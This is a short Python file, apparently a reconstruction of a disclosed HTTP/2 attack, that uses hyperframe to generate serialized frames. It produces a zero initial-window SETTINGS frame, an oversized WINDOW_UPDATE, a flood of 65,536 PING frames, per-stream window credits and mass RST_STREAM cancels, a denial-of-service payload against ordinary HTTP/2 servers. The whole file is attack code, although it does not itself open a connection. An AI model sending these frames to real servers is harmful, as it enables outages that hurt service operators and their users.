from hyperframe.frame import SettingsFrame, WindowUpdateFrame, PingFrame, RstStreamFrame

# Offline reconstruction of the disclosed frame-construction stages only.
def frames(stream_ids, queued_bytes):
    settings = SettingsFrame(0)
    settings.settings[4] = 0
    yield settings.serialize()
    initial_credit = WindowUpdateFrame(0)
    initial_credit.window_increment = 0x7fffffff - 65535
    yield initial_credit.serialize()
    ping = PingFrame(0)
    ping.opaque_data = b'12345678'
    for _ in range(65536):
        yield ping.serialize()
    for stream in stream_ids:
        credit = WindowUpdateFrame(stream)
        credit.window_increment = queued_bytes
        yield credit.serialize()
    refund = WindowUpdateFrame(0)
    refund.window_increment = queued_bytes * len(stream_ids)
    yield refund.serialize()
    for stream in stream_ids:
        reset = RstStreamFrame(stream)
        reset.error_code = 8
        yield reset.serialize()
